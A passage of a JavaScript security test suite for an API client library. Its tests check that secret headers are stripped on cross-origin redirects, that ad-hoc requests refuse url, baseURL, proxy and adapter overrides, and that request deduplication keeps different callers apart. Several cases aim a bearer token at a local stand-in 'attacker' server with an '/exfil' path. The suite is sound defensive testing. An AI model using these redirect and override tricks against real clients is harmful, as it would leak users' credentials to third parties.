   * and, by default, strips `Authorization`/`Cookie`/`Proxy-Authorization`
   * on a cross-origin hop but NOT an arbitrary custom header — the route's
   * static `X-Api-Key` would otherwise ride along to whatever host the
   * FIRST hop's response happened to point at. Must: (a) the FIRST hop (the
   * route's own host) receives X-Api-Key normally, (b) the redirect target
   * receives the followed request but NEVER the X-Api-Key header, (c) the
   * overall call still resolves successfully — redirect-following itself is
   * not broken, only the secret header's survival across the origin
   * boundary is.
   */
  async function securityCrossOriginRedirectStripsRouteHeaderCase(mdp) {
    const routeName = 'secThingRedirect';
    recorder.clear();
    const attacker = await ctx.startRecordingServer();

    // The shared `recorder` always answers a canned 200 — this case needs
    // the FIRST hop to answer 302, so it stands up its own tiny server.
    const redirectRecords = [];
    const redirectServer = http.createServer((req, res) => {
      redirectRecords.push({ method: req.method ?? '', url: req.url ?? '', headers: { ...req.headers } });
      res.writeHead(302, { Location: `${attacker.baseUrl}/landed` });
      res.end();
    });
    const legit = await new Promise((resolve, reject) => {
      redirectServer.on('error', reject);
      redirectServer.listen(0, '127.0.0.1', () => {
        const address = redirectServer.address();
        resolve({ baseUrl: `http://127.0.0.1:${address.port}` });
      });
    });

    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: legit.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/things/:id', headers: { 'X-Api-Key': 'SUPER-SECRET' } } },
    });
    try {
      const apiClient = box.current.apiClient;
      let threw = false;
      let errMessage = '';
      try {
        await apiClient.request(routeName, undefined, { id: '1' });
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const firstHopGotKey = redirectRecords.some((r) => r.headers['x-api-key'] === 'SUPER-SECRET');
      const attackerGotRequest = attacker.records.length > 0;
      const attackerGotKey = attacker.records.some((r) => r.headers['x-api-key'] === 'SUPER-SECRET');
      const pass = !threw && firstHopGotKey && attackerGotRequest && !attackerGotKey;
      results.push({
        id: 'sec-cross-origin-redirect-strips-route-header',
        pass,
        message: pass
          ? `apiClient.request() followed a real cross-origin 302 (route's own host -> a SECOND, independent server) successfully; the FIRST hop received X-Api-Key normally, but the redirect target NEVER received it`
          : `SECURITY FAILURE (redirect header leak): threw=${threw} ("${errMessage}"), first-hop got key=${firstHopGotKey}, attacker got request=${attackerGotRequest}, attacker got key=${attackerGotKey}`,
      });
    } finally {
      unmount();
      await new Promise((r) => redirectServer.close(() => r(undefined)));
      await attacker.close();
    }
  }

  /**
   * fix-percall-header-redirect-leak (defect 1, CONFIRMED DEFECT — the
   * headline bug this task exists to close). `securityCrossOriginRedirect
   * StripsRouteHeaderCase` above only ever proved ROUTE-DECLARED headers are
   * stripped — the redirect-strip set was derived from `route.headers` +
   * the effective auth/CSRF header names, and NEVER from `options.headers`
   * (a per-call header, e.g. a bearer token or API key). That gap survived
   * the ENTIRE previous fix (`fix-b-redirect-credential-leak`) because this
   * exact case never existed. Same real-cross-origin-302 shape as the case
   * above, but the secret rides in `apiClient.request(..., { headers })`
   * instead of the route's own declared headers. Also doubles as POSITIVE
   * CONTROL (b): a genuinely benign header (`Accept`) supplied the SAME way
   * must still reach the redirect target — the fix must not become a
   * "strip everything" over-block.
   */
  async function securityPerCallHeaderCrossOriginRedirectStripsCase(mdp) {
    const routeName = 'secThingPerCallHeaderRedirect';
    recorder.clear();
    const attacker = await ctx.startRecordingServer();
    const redirectRecords = [];
    const redirectServer = http.createServer((req, res) => {
      redirectRecords.push({ method: req.method ?? '', url: req.url ?? '', headers: { ...req.headers } });
      res.writeHead(302, { Location: `${attacker.baseUrl}/landed` });
      res.end();
    });
    const legit = await new Promise((resolve, reject) => {
      redirectServer.on('error', reject);
      redirectServer.listen(0, '127.0.0.1', () => {
        const address = redirectServer.address();
        resolve({ baseUrl: `http://127.0.0.1:${address.port}` });
      });
    });
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: legit.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/things/:id' } },
    });
    try {
      const apiClient = box.current.apiClient;
      let threw = false;
      let errMessage = '';
      try {
        await apiClient.request(routeName, undefined, { id: '1' }, {
          headers: { 'X-Custom-Secret-Token': 'PER-CALL-SECRET-VALUE', Accept: 'application/json' },
        });
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const firstHopGotSecret = redirectRecords.some((r) => r.headers['x-custom-secret-token'] === 'PER-CALL-SECRET-VALUE');
      const attackerGotRequest = attacker.records.length > 0;
      const attackerGotSecret = attacker.records.some((r) => r.headers['x-custom-secret-token'] === 'PER-CALL-SECRET-VALUE');
      const attackerGotBenign = attacker.records.some((r) => r.headers['accept'] === 'application/json');
      const pass = !threw && firstHopGotSecret && attackerGotRequest && !attackerGotSecret && attackerGotBenign;
      results.push({
        id: 'sec-percall-header-cross-origin-redirect-strips',
        pass,
        message: pass
          ? `apiClient.request() with a PER-CALL secret header (options.headers) followed a real cross-origin 302 successfully; the FIRST hop received it normally, the redirect target NEVER did, and a benign per-call header (Accept) still reached the redirect target`
          : `SECURITY FAILURE (per-call header redirect leak): threw=${threw} ("${errMessage}"), first-hop got secret=${firstHopGotSecret}, attacker got request=${attackerGotRequest}, attacker got secret=${attackerGotSecret}, attacker got benign header=${attackerGotBenign}`,
      });
    } finally {
      unmount();
      await new Promise((r) => redirectServer.close(() => r(undefined)));
      await attacker.close();
    }
  }

  /**
   * fix-percall-header-redirect-leak (defect 1, requestRaw dispatch path).
   * Same per-call-header-over-redirect shape as the case immediately above,
   * but dispatched through `requestRaw` (an UNREGISTERED, leading-slash
   * path) — the THIRD of the three confirmed-leaking dispatch paths. This
   * path previously called `this.sensitiveHeaderNames()` with NO route
   * headers argument at all, so it depended entirely on the auth/CSRF names
   * — a per-call header was never covered here either.
   */
  async function securityRequestRawPerCallHeaderCrossOriginRedirectStripsCase(mdp) {
    recorder.clear();
    const attacker = await ctx.startRecordingServer();
    const redirectRecords = [];
    const redirectServer = http.createServer((req, res) => {
      redirectRecords.push({ method: req.method ?? '', url: req.url ?? '', headers: { ...req.headers } });
      res.writeHead(302, { Location: `${attacker.baseUrl}/landed` });
      res.end();
    });
    const legit = await new Promise((resolve, reject) => {
      redirectServer.on('error', reject);
      redirectServer.listen(0, '127.0.0.1', () => {
        const address = redirectServer.address();
        resolve({ baseUrl: `http://127.0.0.1:${address.port}` });
      });
    });
    const { box, unmount } = await mountProviderContext(mdp, { apiUrl: legit.baseUrl, routes: {} });
    try {
      const apiClient = box.current.apiClient;
      let threw = false;
      let errMessage = '';
      try {
        // Leading-slash, unregistered path -> requestRaw (ApiClient.ts's
        // `routeName.startsWith('/')` branch).
        await apiClient.request('/ad-hoc-raw-redirect', undefined, undefined, {
          headers: { 'X-Custom-Secret-Token': 'RAW-PATH-SECRET-VALUE' },
        });
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const firstHopGotSecret = redirectRecords.some((r) => r.headers['x-custom-secret-token'] === 'RAW-PATH-SECRET-VALUE');
      const attackerGotRequest = attacker.records.length > 0;
      const attackerGotSecret = attacker.records.some((r) => r.headers['x-custom-secret-token'] === 'RAW-PATH-SECRET-VALUE');
      const pass = !threw && firstHopGotSecret && attackerGotRequest && !attackerGotSecret;
      results.push({
        id: 'sec-requestraw-percall-header-cross-origin-redirect-strips',
        pass,
        message: pass
          ? `apiClient.request('/ad-hoc-raw-redirect', ..., { headers }) — requestRaw's dispatch path — followed a real cross-origin 302 successfully; the FIRST hop received the per-call secret normally, the redirect target NEVER did`
          : `SECURITY FAILURE (requestRaw per-call header redirect leak): threw=${threw} ("${errMessage}"), first-hop got secret=${firstHopGotSecret}, attacker got request=${attackerGotRequest}, attacker got secret=${attackerGotSecret}`,
      });
    } finally {
      unmount();
      await new Promise((r) => redirectServer.close(() => r(undefined)));
      await attacker.close();
    }
  }

  /**
   * fix-percall-header-redirect-leak — HIGHEST-RISK implementation detail
   * (per the architect design's own risk list): the seal must run AFTER
   * plugin `onRequestIntercept` middleware, not at config-assembly time. A
   * plugin that injects a header (e.g. an auth-provider adapter adding its
   * own bearer token) must have THAT header stripped on a cross-origin
   * redirect too — proving the seal reads the FINAL header map, not an
   * enumerated list of "known" sources computed before the plugin ran.
   */
  async function securityPluginInjectedHeaderCrossOriginRedirectStripsCase(mdp) {
    const routeName = 'secThingPluginHeaderRedirect';
    recorder.clear();
    const attacker = await ctx.startRecordingServer();
    const redirectRecords = [];
    const redirectServer = http.createServer((req, res) => {
      redirectRecords.push({ method: req.method ?? '', url: req.url ?? '', headers: { ...req.headers } });
      res.writeHead(302, { Location: `${attacker.baseUrl}/landed` });
      res.end();
    });
    const legit = await new Promise((resolve, reject) => {
      redirectServer.on('error', reject);
      redirectServer.listen(0, '127.0.0.1', () => {
        const address = redirectServer.address();
        resolve({ baseUrl: `http://127.0.0.1:${address.port}` });
      });
    });
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: legit.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/things/:id' } },
      plugins: [
        {
          name: 'header-injector-plugin',
          onRequestIntercept: (req) => ({
            ...req,
            headers: { ...req.headers, 'X-Plugin-Injected-Secret': 'PLUGIN-INJECTED-SECRET-VALUE' },
          }),
        },
      ],
    });
    try {
      const apiClient = box.current.apiClient;
      let threw = false;
      let errMessage = '';
      try {
        await apiClient.request(routeName, undefined, { id: '1' });
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const firstHopGotSecret = redirectRecords.some((r) => r.headers['x-plugin-injected-secret'] === 'PLUGIN-INJECTED-SECRET-VALUE');
      const attackerGotRequest = attacker.records.length > 0;
      const attackerGotSecret = attacker.records.some((r) => r.headers['x-plugin-injected-secret'] === 'PLUGIN-INJECTED-SECRET-VALUE');
      const pass = !threw && firstHopGotSecret && attackerGotRequest && !attackerGotSecret;
      results.push({
        id: 'sec-plugin-injected-header-cross-origin-redirect-strips',
        pass,
        message: pass
          ? `a plugin onRequestIntercept-injected header survived the FIRST hop (proving the plugin ran) but was stripped on the cross-origin redirect — the seal reads headers AFTER plugin interception, not before`
          : `SECURITY FAILURE (plugin-injected header redirect leak): threw=${threw} ("${errMessage}"), first-hop got secret=${firstHopGotSecret}, attacker got request=${attackerGotRequest}, attacker got secret=${attackerGotSecret}`,
      });
    } finally {
      unmount();
      await new Promise((r) => redirectServer.close(() => r(undefined)));
      await attacker.close();
    }
  }

  /**
   * POSITIVE CONTROL (c): a SAME-origin redirect (the route's own host
   * redirecting to a DIFFERENT path on itself, not a different host) must
   * still forward a per-call secret header normally — the fix must not
   * become "strip on every redirect", only cross-origin ones. axios/
   * follow-redirects' own `isSameOriginRedirect` check (protocol+host+port)
   * is what `sensitiveHeaders` stripping is gated on; this proves the strip
   * set being NON-EMPTY (a real secret name IS in it) does not, by itself,
   * strip anything when the hop never crosses an origin boundary.
   */
  async function securitySameOriginRedirectKeepsHeaderCase(mdp) {
    const routeName = 'secThingSameOriginRedirect';
    recorder.clear();
    const landedRecords = [];
    const server = http.createServer((req, res) => {
      if ((req.url ?? '').startsWith('/landed')) {
        landedRecords.push({ method: req.method ?? '', url: req.url ?? '', headers: { ...req.headers } });
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ success: true }));
        return;
      }
      res.writeHead(302, { Location: '/landed' });
      res.end();
    });
    const legit = await new Promise((resolve, reject) => {
      server.on('error', reject);
      server.listen(0, '127.0.0.1', () => {
        const address = server.address();
        resolve({ baseUrl: `http://127.0.0.1:${address.port}` });
      });
    });
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: legit.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/things/:id' } },
    });
    try {
      const apiClient = box.current.apiClient;
      let threw = false;
      let errMessage = '';
      try {
        await apiClient.request(routeName, undefined, { id: '1' }, {
          headers: { 'X-Custom-Secret-Token': 'SAME-ORIGIN-SECRET-VALUE' },
        });
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const landedGotSecret = landedRecords.some((r) => r.headers['x-custom-secret-token'] === 'SAME-ORIGIN-SECRET-VALUE');
      const pass = !threw && landedRecords.length > 0 && landedGotSecret;
      results.push({
        id: 'sec-same-origin-redirect-keeps-header-positive-control',
        pass,
        message: pass
          ? `POSITIVE CONTROL: a SAME-origin redirect (route's own host -> a different path on itself) still carried the per-call secret header to the landed request — the fix strips on cross-origin hops only`
          : `POSITIVE CONTROL FAILURE (over-broad strip): threw=${threw} ("${errMessage}"), landed got request=${landedRecords.length > 0}, landed got secret=${landedGotSecret}`,
      });
    } finally {
      unmount();
      await new Promise((r) => server.close(() => r(undefined)));
    }
  }

  /**
   * POSITIVE CONTROL (d): a 307 (Temporary Redirect — the one redirect
   * status that must preserve the original method AND body, unlike 301/302/
   * 303 which browsers/axios may downgrade to GET) across a cross-origin
   * hop must still strip the sensitive header AND still carry the POST body
   * to the redirect target. Proves the fix does not accidentally interfere
   * with body-preserving redirect semantics.
   */
  async function security307CrossOriginPostBodySurvivesHeaderStripCase(mdp) {
    const routeName = 'secThing307Redirect';
    recorder.clear();
    const attacker = await ctx.startRecordingServer();
    const redirectRecords = [];
    const redirectServer = http.createServer((req, res) => {
      const chunks = [];
      req.on('data', (c) => chunks.push(c));
      req.on('end', () => {
        redirectRecords.push({
          method: req.method ?? '',
          url: req.url ?? '',
          headers: { ...req.headers },
          rawBody: Buffer.concat(chunks).toString('utf8'),
        });
        res.writeHead(307, { Location: `${attacker.baseUrl}/landed` });
        res.end();
      });
    });
    const legit = await new Promise((resolve, reject) => {
      redirectServer.on('error', reject);
      redirectServer.listen(0, '127.0.0.1', () => {
        const address = redirectServer.address();
        resolve({ baseUrl: `http://127.0.0.1:${address.port}` });
      });
    });
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: legit.baseUrl,
      routes: { [routeName]: { method: 'POST', url: '/things' } },
    });
    try {
      const apiClient = box.current.apiClient;
      let threw = false;
      let errMessage = '';
      try {
        await apiClient.request(routeName, { note: 'hello' }, undefined, {
          headers: { 'X-Custom-Secret-Token': '307-SECRET-VALUE' },
        });
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const firstHopRec = redirectRecords[0];
      const attackerRec = attacker.records[attacker.records.length - 1];
      const firstHopGotSecret = firstHopRec?.headers['x-custom-secret-token'] === '307-SECRET-VALUE';
      const attackerGotSecret = attacker.records.some((r) => r.headers['x-custom-secret-token'] === '307-SECRET-VALUE');
      const attackerKeptMethod = attackerRec?.method === 'POST';
      const attackerKeptBody = !!attackerRec && attackerRec.rawBody.includes('hello');
      const pass = !threw && firstHopGotSecret && !attackerGotSecret && attackerKeptMethod && attackerKeptBody;
      results.push({
        id: 'sec-307-cross-origin-post-body-survives-header-strip',
        pass,
        message: pass
          ? `POSITIVE CONTROL: a 307 cross-origin redirect still carried the POST method + body to the redirect target while the per-call secret header was stripped`
          : `307 POSITIVE CONTROL FAILURE: threw=${threw} ("${errMessage}"), first-hop got secret=${firstHopGotSecret}, attacker got secret=${attackerGotSecret}, attacker method=${attackerRec?.method}, attacker kept body=${attackerKeptBody}`,
      });
    } finally {
      unmount();
      await new Promise((r) => redirectServer.close(() => r(undefined)));
      await attacker.close();
    }
  }

  /**
   * fix-2.2.0-blockers, THE FOURTH EXFILTRATION CHANNEL (item 1). Every case
   * below dispatches through `requestRaw` — an UNREGISTERED, leading-slash
   * path (ApiClient.ts's `routeName.startsWith('/')` branch) that a bare
   * `apiClient.request(...)` call reaches DIRECTLY, exactly the surface
   * `useMinder('/ad-hoc', { axiosConfig })` (useMinder.ts:794) also funnels
   * into. `requestRaw` used to spread the caller's ENTIRE `otherOptions` bag
   * straight into the outgoing config — the SAME shape fixed for the
   * registered-route path 240+ lines away, reintroduced here because the two
   * methods built their own axios config independently. Every request this
   * path dispatches carries the caller's BEARER TOKEN, attached by the SAME
   * axios request interceptor (`applySecurityHeaders`) the registered-route
   * path uses — set here via `authManager.setToken(...)`, exactly like a
   * real authenticated app. A SECOND, independent recording server stands in
   * for the attacker host; every case asserts (a) a throw before dispatch,
   * (b) ZERO requests reached EITHER server, and (c) the token never
   * appears, byte-for-byte, on the attacker server even if some other code
   * path let a request through.
   */
  async function securityRequestRawUrlChannelRefusesCase(mdp) {
    recorder.clear();
    const attacker = await ctx.startRecordingServer();
    const { box, unmount } = await mountProviderContext(mdp, { apiUrl: recorder.baseUrl, routes: {} });
    try {
      box.current.authManager.setToken('TOKEN-SUPER-SECRET');
      const apiClient = box.current.apiClient;
      let threw = false;
      let errCode;
      let errMessage = '';
      try {
        await apiClient.request('/ad-hoc-raw', undefined, undefined, { url: `${attacker.baseUrl}/exfil` });
      } catch (e) {
        threw = true;
        errCode = e?.code;
        errMessage = e?.message ?? String(e);
      }
      const legitTouched = recorder.records.length > 0;
      const attackerTouched = attacker.records.length > 0;
      const tokenLeaked = attacker.records.some((r) => String(r.headers['authorization'] || '').includes('TOKEN-SUPER-SECRET'));
      const pass = threw && !legitTouched && !attackerTouched && !tokenLeaked && errCode === 'UNSAFE_REQUEST_OPTION_OVERRIDE';
      results.push({
        id: 'sec-requestraw-options-url-cross-origin-refuses-no-token-leak',
        pass,
        message: pass
          ? `apiClient.request('/ad-hoc-raw', ..., { url: "${attacker.baseUrl}/exfil" }) — an UNREGISTERED path reaching requestRaw — refused (code="${errCode}", "${errMessage}") before dispatch; the bearer token reached NEITHER server (legit=${recorder.records.length}, attacker=${attacker.records.length})`
          : `SECURITY FAILURE (requestRaw, options.url): threw=${threw} (code="${errCode}", "${errMessage}"), legit=${recorder.records.length}, attacker=${attacker.records.length}, token leaked=${tokenLeaked}`,
      });
    } finally {
      unmount();
      await attacker.close();
    }
  }

  async function securityRequestRawBaseUrlChannelRefusesCase(mdp) {
    recorder.clear();
    const attacker = await ctx.startRecordingServer();
    const { box, unmount } = await mountProviderContext(mdp, { apiUrl: recorder.baseUrl, routes: {} });
    try {
      box.current.authManager.setToken('TOKEN-SUPER-SECRET');
      const apiClient = box.current.apiClient;
      let threw = false;
      let errCode;
      let errMessage = '';
      try {
        await apiClient.request('/ad-hoc-raw-baseurl', undefined, undefined, { baseURL: attacker.baseUrl });
      } catch (e) {
        threw = true;
        errCode = e?.code;
        errMessage = e?.message ?? String(e);
      }
      const legitTouched = recorder.records.length > 0;
      const attackerTouched = attacker.records.length > 0;
      const tokenLeaked = attacker.records.some((r) => String(r.headers['authorization'] || '').includes('TOKEN-SUPER-SECRET'));
      const pass = threw && !legitTouched && !attackerTouched && !tokenLeaked && errCode === 'UNSAFE_REQUEST_OPTION_OVERRIDE';
      results.push({
        id: 'sec-requestraw-options-baseurl-cross-origin-refuses-no-token-leak',
        pass,
        message: pass
          ? `apiClient.request('/ad-hoc-raw-baseurl', ..., { baseURL: "${attacker.baseUrl}" }) refused (code="${errCode}", "${errMessage}") before dispatch; the bearer token reached NEITHER server (legit=${recorder.records.length}, attacker=${attacker.records.length})`
          : `SECURITY FAILURE (requestRaw, options.baseURL): threw=${threw} (code="${errCode}", "${errMessage}"), legit=${recorder.records.length}, attacker=${attacker.records.length}, token leaked=${tokenLeaked}`,
      });
    } finally {
      unmount();
      await attacker.close();
    }
  }

  async function securityRequestRawProxyChannelRefusesCase(mdp) {
    recorder.clear();
    const attacker = await ctx.startRecordingServer();
    const attackerUrl = new URL(attacker.baseUrl);
    const { box, unmount } = await mountProviderContext(mdp, { apiUrl: recorder.baseUrl, routes: {} });
    try {
      box.current.authManager.setToken('TOKEN-SUPER-SECRET');
      const apiClient = box.current.apiClient;
      let threw = false;
      let errCode;
      let errMessage = '';
      try {
        await apiClient.request('/ad-hoc-raw-proxy', undefined, undefined, {
          proxy: { host: attackerUrl.hostname, port: Number(attackerUrl.port) },
        });
      } catch (e) {
        threw = true;
        errCode = e?.code;
        errMessage = e?.message ?? String(e);
      }
      const legitTouched = recorder.records.length > 0;
      const attackerTouched = attacker.records.length > 0;
      const tokenLeaked = attacker.records.some((r) => String(r.headers['authorization'] || '').includes('TOKEN-SUPER-SECRET'));
      const pass = threw && !legitTouched && !attackerTouched && !tokenLeaked && errCode === 'UNSAFE_REQUEST_OPTION_OVERRIDE';
      results.push({
        id: 'sec-requestraw-options-proxy-cross-origin-refuses-no-token-leak',
        pass,
        message: pass
          ? `apiClient.request('/ad-hoc-raw-proxy', ..., { proxy: {host, port} pointing at ${attacker.baseUrl} }) refused (code="${errCode}", "${errMessage}") before dispatch; the bearer token reached NEITHER server (legit=${recorder.records.length}, attacker=${attacker.records.length})`
          : `SECURITY FAILURE (requestRaw, options.proxy): threw=${threw} (code="${errCode}", "${errMessage}"), legit=${recorder.records.length}, attacker=${attacker.records.length}, token leaked=${tokenLeaked}`,
      });
    } finally {
      unmount();
      await attacker.close();
    }
  }

  async function securityRequestRawTransportHijackFamilyRefusesCase(mdp) {
    recorder.clear();
    const { box, unmount } = await mountProviderContext(mdp, { apiUrl: recorder.baseUrl, routes: {} });
    try {
      box.current.authManager.setToken('TOKEN-SUPER-SECRET');
      const apiClient = box.current.apiClient;
      let threw = false;
      let errCode;
      let errMessage = '';
      let adapterCalled = false;
      try {
        await apiClient.request('/ad-hoc-raw-transport', undefined, undefined, {
          adapter: () => {
            adapterCalled = true;
            throw new Error('adapter should never run');
          },
          transformRequest: [(d) => d],
          httpAgent: {},
        });
      } catch (e) {
        threw = true;
        errCode = e?.code;
        errMessage = e?.message ?? String(e);
      }
      const legitTouched = recorder.records.length > 0;
      const pass = threw && !adapterCalled && !legitTouched && errCode === 'UNSAFE_REQUEST_OPTION_OVERRIDE';
      results.push({
        id: 'sec-requestraw-options-transport-hijack-family-refuses',
        pass,
        message: pass
          ? `apiClient.request('/ad-hoc-raw-transport', ..., { adapter, transformRequest, httpAgent }) refused with code "${errCode}" ("${errMessage}") before dispatch — the canary adapter was NEVER invoked and zero requests reached the wire, proving requestRaw is now covered by the SAME allowlist as the registered-route path`
          : `SECURITY FAILURE (requestRaw, transport-hijack family): threw=${threw} (code="${errCode}", "${errMessage}"), adapter WAS invoked=${adapterCalled}, legit=${recorder.records.length}`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * The OTHER `requestRaw` entry point (`isAbsoluteUrl === true` — an
   * `https?://` route name, not a leading-slash unregistered path). Proves
   * the fix covers BOTH branches that dispatch through `requestRaw`, not
   * just the leading-slash one the other cases above exercise.
   */
  async function securityRequestRawAbsoluteUrlBaseUrlChannelRefusesCase(mdp) {
    recorder.clear();
    const attacker = await ctx.startRecordingServer();
    const { box, unmount } = await mountProviderContext(mdp, { apiUrl: recorder.baseUrl, routes: {} });
    try {
      box.current.authManager.setToken('TOKEN-SUPER-SECRET');
      const apiClient = box.current.apiClient;
      let threw = false;
      let errCode;
      let errMessage = '';
      try {
        await apiClient.request(`${recorder.baseUrl}/absolute-adhoc`, undefined, undefined, { baseURL: attacker.baseUrl });
      } catch (e) {
        threw = true;
        errCode = e?.code;
        errMessage = e?.message ?? String(e);
      }
      const legitTouched = recorder.records.length > 0;
      const attackerTouched = attacker.records.length > 0;
      const tokenLeaked = attacker.records.some((r) => String(r.headers['authorization'] || '').includes('TOKEN-SUPER-SECRET'));
      const pass = threw && !legitTouched && !attackerTouched && !tokenLeaked && errCode === 'UNSAFE_REQUEST_OPTION_OVERRIDE';
      results.push({
        id: 'sec-requestraw-absolute-url-entry-baseurl-refuses-no-token-leak',
        pass,
        message: pass
          ? `apiClient.request('${recorder.baseUrl}/absolute-adhoc', ..., { baseURL: "${attacker.baseUrl}" }) — the ABSOLUTE-URL requestRaw entry point — refused (code="${errCode}", "${errMessage}") before dispatch; the bearer token reached NEITHER server (legit=${recorder.records.length}, attacker=${attacker.records.length})`
          : `SECURITY FAILURE (requestRaw absolute-URL entry, options.baseURL): threw=${threw} (code="${errCode}", "${errMessage}"), legit=${recorder.records.length}, attacker=${attacker.records.length}, token leaked=${tokenLeaked}`,
      });
    } finally {
      unmount();
      await attacker.close();
    }
  }

  /**
   * End-to-end reachability (fix-2.2.0-blockers, item 1): the REAL, public
   * `useMinder()` hook, no direct `apiClient.request()` call at all — exactly
   * useMinder.ts:794's `...options.axiosConfig` passthrough on an
   * UNREGISTERED, leading-slash route name (the N4 string-shorthand bypass),
   * which is precisely how a query reaches `requestRaw`. Proves the fix
   * holds at the actual documented public surface, not only the lower-level
   * `apiClient.request()` surface the other cases in this section use.
   */
  async function securityUseMinderAxiosConfigUrlChannelRefusesCase(mdp) {
    recorder.clear();
    const attacker = await ctx.startRecordingServer();
    const { box, unmount } = await mountProviderHookWithOptions(
      mdp,
      '/ad-hoc-axios-config',
      { axiosConfig: { url: `${attacker.baseUrl}/exfil` } },
      { apiUrl: recorder.baseUrl, routes: {} },
      (r) => r !== undefined && r.loading === false,
    );
    try {
      await waitFor(() => box.current?.loading === false, { timeout: 2000 });
      const legitTouched = recorder.records.length > 0;
      const attackerTouched = attacker.records.length > 0;
      const surfacedFailure = box.current?.success === false && box.current?.error !== null && box.current?.error !== undefined;
      const pass = !legitTouched && !attackerTouched && surfacedFailure;
      results.push({
        id: 'sec-usemander-axiosconfig-url-cross-origin-refuses',
        pass,
        message: pass
          ? `useMinder('/ad-hoc-axios-config', { axiosConfig: { url } }) — the REAL public hook, reaching requestRaw via useMinder.ts's axiosConfig passthrough — never touched EITHER server (legit=${recorder.records.length}, attacker=${attacker.records.length}) and surfaced the refusal as a query failure (success:false, error set) instead of silently dispatching`
          : `SECURITY FAILURE (useMinder axiosConfig -> requestRaw): legit=${recorder.records.length}, attacker=${attacker.records.length}, success=${box.current?.success}, error=${JSON.stringify(box.current?.error)}`,
      });
    } finally {
      unmount();
      await attacker.close();
    }
  }

  /**
   * DEDUP KEY DIVERGENCE (fix-2.2.0-blockers, item 2 — genuinely exercises
   * divergence, unlike `sec-dedup-concurrent-distinct-url-overrides-both-
   * refuse-no-collapse` above, which only proves both calls refuse and never
   * asserts what happens when TWO CALLS ARE BOTH LEGITIMATE but differ only
   * in `params`). Two concurrent `apiClient.request()` calls to the SAME
   * route, SAME method, SAME body — differing ONLY in `options.params`
   * (`{q:'alpha'}` vs `{q:'beta'}`). Before this fix both produced the
   * IDENTICAL cache key (`params` was never read for it), collapsing into
   * ONE wire request and handing BOTH callers the SAME response. The
   * recording server always echoes the URL it actually received
   * (`receivedUrl`) back in the response body, so this asserts EACH caller's
   * OWN result reflects ITS OWN query string — not the other caller's — AND
   * that the wire saw TWO separate requests, not one.
   */
  async function securityDedupParamsDivergenceNoCollapseCase(mdp) {
    const routeName = 'secDedupParams';
    recorder.clear();
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/dedup-params' } },
      performance: { deduplication: true },
    });
    try {
      const apiClient = box.current.apiClient;
      const [resultA, resultB] = await Promise.all([
        apiClient.request(routeName, undefined, undefined, { params: { q: 'alpha' } }),
        apiClient.request(routeName, undefined, undefined, { params: { q: 'beta' } }),
      ]);
      const twoWireRequests = recorder.records.length === 2;
      const aGotOwnResponse = resultA?.receivedUrl === '/dedup-params?q=alpha';
      const bGotOwnResponse = resultB?.receivedUrl === '/dedup-params?q=beta';
      const pass = twoWireRequests && aGotOwnResponse && bGotOwnResponse;
      results.push({
        id: 'sec-dedup-params-divergence-no-cross-tenant-collapse',
        pass,
        message: pass
          ? `two concurrent GETs to the SAME route with DIFFERENT params ({q:'alpha'} / {q:'beta'}) dispatched as TWO separate wire requests (${recorder.records.length}) and EACH caller received the response matching ITS OWN request (A="${resultA?.receivedUrl}", B="${resultB?.receivedUrl}") — no cross-tenant collapse`
          : `DEDUP/SECURITY FAILURE: wire requests=${recorder.records.length} (expected 2), A got "${resultA?.receivedUrl}" (expected /dedup-params?q=alpha), B got "${resultB?.receivedUrl}" (expected /dedup-params?q=beta): ${JSON.stringify(recorder.records)}`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * DEDUP KEY DIVERGENCE, CHANNEL 2 (item 2): the reported repro verbatim —
   * two concurrent GETs differing ONLY in a per-call `options.headers`
   * (`{'X-User':'alice'}` / `{'X-User':'bob'}'`). Before this fix `headers`
   * was NEVER part of the cache key at all (not even after the "derive from
   * requestConfig" round that only re-read `method`/`url`), so this
   * collapsed into ONE wire request and "BOB RECEIVED ALICE'S RESPONSE" —
   * cross-tenant disclosure under per-request auth. Asserts the wire itself
   * saw TWO separate requests, each carrying its OWN caller's header — not
   * one request winning and the other silently sharing its response.
   */
  async function securityDedupHeadersDivergenceNoCollapseCase(mdp) {
    const routeName = 'secDedupHeaders';
    recorder.clear();
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/dedup-headers' } },
      performance: { deduplication: true },
    });
    try {
      const apiClient = box.current.apiClient;
      await Promise.all([
        apiClient.request(routeName, undefined, undefined, { headers: { 'X-User': 'alice' } }),
        apiClient.request(routeName, undefined, undefined, { headers: { 'X-User': 'bob' } }),
      ]);
      const twoWireRequests = recorder.records.length === 2;
      const aliceRecord = recorder.records.find((r) => r.headers['x-user'] === 'alice');
      const bobRecord = recorder.records.find((r) => r.headers['x-user'] === 'bob');
      const pass = twoWireRequests && !!aliceRecord && !!bobRecord;
      results.push({
        id: 'sec-dedup-headers-divergence-no-cross-tenant-collapse',
        pass,
        message: pass
          ? `two concurrent GETs to the SAME route with DIFFERENT per-call headers ({'X-User':'alice'} / {'X-User':'bob'}) dispatched as TWO separate wire requests, EACH carrying its OWN header — no collapse, no cross-tenant response sharing`
          : `DEDUP/SECURITY FAILURE: wire requests=${recorder.records.length} (expected 2), alice record found=${!!aliceRecord}, bob record found=${!!bobRecord}: ${JSON.stringify(recorder.records)}`,
      });
    } finally {
      unmount();
    }
  }

  /**
